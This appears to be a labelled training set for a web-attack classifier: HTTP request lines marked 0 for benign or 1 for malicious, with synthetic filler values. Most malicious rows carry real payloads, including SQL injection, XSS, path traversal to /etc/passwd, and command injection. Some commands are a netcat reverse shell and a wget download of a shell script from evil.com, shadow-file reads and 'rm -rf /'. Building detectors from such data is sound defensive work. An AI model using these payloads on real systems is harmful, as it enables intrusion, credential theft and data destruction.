HEAD /images/logo.png?rating=best+regards&view=....%5C%5C....%5C%5C....%5C%5Cwindows%5C%5Csystem32&comment=thank+you&content=contact+me+at+email@example.com&columns=thank+you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /help/faq?id=379&limit=123+Main+St&price_min=503&email=admin+access+request&view=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /about?page=best+regards&filters=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
POST /help/faq name=123+Main+St&user_id=my+address+is&id=please+find+attached&username=test+user&tracking=thank%20%24%28cat%20/etc/shadow%29%20regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /api/v1/data?rating=%3Csvg/onload%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/orders title=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /api/search content=admin+access+request&color=984&type=thank+you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /about?title=contact+me+at+email@example.com&price_min=%26%20%24%28which%20bash%29%20-c%20%27ls%27 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /profile?q=hello%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20email%40example.com&price_max=please+find+attached User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /register view=283 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /api/search?email=%26%20nc%20-e%20/bin/bash%20evil.com%204444&filters=my+address+is&user_id=system+log+entry&sort=83 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /js/app.js?email=74&name=thank+you&phone=my%20%3Csvg/onload%3Dalert%281%29%3E%20St User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /products/123 search_term=this%20%3Csvg/onload%3Dalert%281%29%3E%20entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /help/faq content=this+is+a+normal+comment&view=343 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /api/users?tags=admin%20%3Bcat%24%7BIFS%7D/etc/passwd%20entry&order_id=832 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /register?comment=thank%20%3Csvg/onload%3Dalert%281%29%3E%20is&region=796 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /dashboard?comment=contact+me+at+email@example.com&city=123+Main+St&category=123%20%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E%20email%40example.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/products?id=system%20%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL--%20user&session=636 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /users/456 title=812&search=814 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /api/search region=thank+you&search=this+is+a+normal+comment&password=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /api/reports?name=787&price_min=my+address+is&tracking=316&new_password=this+is+a+normal+comment&search=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /api/v2/analytics price_min=%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd&last_name=197&session=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /images/logo.png?title=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /help/faq order=system+log+entry&author=system+log+entry&price_min=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST /profile email=791&sort=401 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /about?id=my+address+is&tags=431&filters=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /help/faq?date=165&first_name=best+regards&tracking=hello+world&search_term=this%20%7Cc%27a%27t%20/etc/passwd%20email%40example.com&content=695 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /about?columns=contact+me+at+email@example.com&view=812&user_id=680&order=934&order_id=286 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /api/v1/data?tracking=John+Doe&old_password=266&columns=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&phone=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /docs/api?old_password=my+address+is&q=I+would+like+to+order&email=754&last_name=best%20%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%20is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /register?search_term=353&status=I%20%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E%20attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /help/faq?token=875&phone=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&name=hello+world&status=thank+you&price_min=298 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /about tags=319&region=thank+you&limit=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /contact?action=/var/www/../../etc/passwd&age=thank+you&first_name=this+is+a+normal+comment&password=511 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /register?name=123+Main+St&price_max=admin+access+request&search=I+would+like+to+order User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /api/search?content=system+log+entry&search_term=test+user User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
POST /api/users region=contact%20%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--%20request&comment=123+Main+St User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/reports session=please%20admin%27--%20comment&date=918 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /css/style.css?order_id=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /api/v2/analytics?author=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&color=788 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/v1/data?last_name=please%20%24%28cat%20/etc/shadow%29%20you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /api/search?filter=602&q=788&action=%27%20AND%201%3D1--&age=129 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /settings?city=this+is+a+normal+comment&view=807&date=I+would+like+to+order&q=65&title=858 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /contact?lang=%7C%20cat%20/etc/passwd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /users/456?category=I%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /images/logo.png?price_max=967&comment=705&format=501&search_term=247&content=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /api/search q=878&name=61&token=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT /contact password=my+address+is&new_password=7&tracking=my+address+is&order_id=test+user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /login?sort=481&type=thank+you&region=thank+you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /api/search?city=%3B%20ls%20-la User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /profile sort=%7Cawk%20%27%7Bprint%20%241%7D%27%20/etc/passwd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /css/style.css?token=28&comment=this+is+a+normal+comment&date=this+is+a+normal+comment&id=thank%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20regards&user_id=431 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /users/456?password=327&format=test+user&region=423 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /login lang=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /contact?password=13&rating=thank%20%3B%20rm%20-rf%20/%20is&order=311 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/v2/analytics?type=649&sort=617&color=hello+world&title=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /api/orders author=system%20%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd%20is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /api/orders city=John+Doe&price_min=I+would+like+to+order&user_id=296 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /js/app.js token=807&view=58&type=please+find+attached&author=515 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /images/logo.png?view=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /posts/789 city=12&new_password=hello+world&region=test+user&title=%27%3B%20DROP%20TABLE%20users-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /api/v1/data q=contact+me+at+email@example.com&color=233&price_min=John+Doe&type=280&order_id=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /api/users?last_name=hello%20%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%20regards&color=123+Main+St&type=contact+me+at+email@example.com&password=643 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /api/orders email=251&tag=please+find+attached&date=690&price_max=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /users/456 sort=test%20%27%20AND%20%27x%27%3D%27x%20you&token=168 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /js/app.js?limit=123+Main+St&user_id=contact+me+at+email@example.com&phone=best+regards&status=....%5C%5C....%5C%5C....%5C%5Cwindows%5C%5Csystem32&format=884 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /about?token=my%20admin%27%20OR%20%271%27%3D%271%20comment&email=114 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /api/products?order_id=hello+world&tags=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&content=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /css/style.css?session=39&order_id=John%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20regards User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /api/reports sort=558&type=96&old_password=665&session=493&email=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT /api/users email=609&author=32&product_id=545&format=874 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /about?category=251&tag=%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/products?lang=contact%20%27%20OR%201%3D1--%20regards&product_id=873&tags=I+would+like+to+order&price_min=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /posts/789?date=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /posts/789?new_password=280&tags=system+log+entry&format=990&old_password=%27%3B%20DROP%20TABLE%20users-- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/v2/analytics?price_min=%60id%60 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /js/app.js?order_id=130&first_name=123+Main+St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
OPTIONS /login?first_name=58&comment=582&author=test+user&lang=I%20%27%20AND%20SLEEP%285%29--%20world User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /docs/api category=thank%20%7Cawk%20%27%7Bprint%20%241%7D%27%20/etc/passwd%20St&rating=587&view=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/v1/data region=637&id=John%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20order&action=220&filters=please+find+attached User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /css/style.css search=979 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /posts/789 first_name=123%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /js/app.js color=572&price_min=%27%20AND%201%3D1-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /docs/api price_max=702&first_name=405&name=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&filters=835 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /login filter=207 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /api/orders tag=admin%20%3B%20wget%20http%3A//evil.com/shell.sh%20request User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /settings?rating=John+Doe&status=157&id=%27%20AND%20%27x%27%3D%27x&price_max=331&type=183 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /login email=%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60&action=443&last_name=128&first_name=216 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /users/456?first_name=test%20%7Cc%27a%27t%20/etc/passwd%20entry&email=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /api/products view=125&user_id=%3Csvg%20onload%3Dalert%281%29%3E&format=test+user&search=John+Doe&old_password=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /about name=please%20../../../etc/passwd%20entry&author=admin+access+request&sort=542&user_id=410 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /about?session=please+find+attached&page=671&view=system+log+entry&quantity=my%20%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29%20entry&lang=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /js/app.js?color=237&old_password=885&email=%26%20whoami&user_id=348&q=123+Main+St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /images/logo.png token=best%20%60id%60%20user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/users?city=contact+me+at+email@example.com&token=%27%20AND%20%27x%27%3D%27x&page=admin+access+request&first_name=218 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /api/v1/data?new_password=532&password=466&token=167&phone=thank+you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /dashboard content=592&session=689&tracking=67&order_id=123%20%27%3B%20SELECT%20pg_sleep%285%29--%20world User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
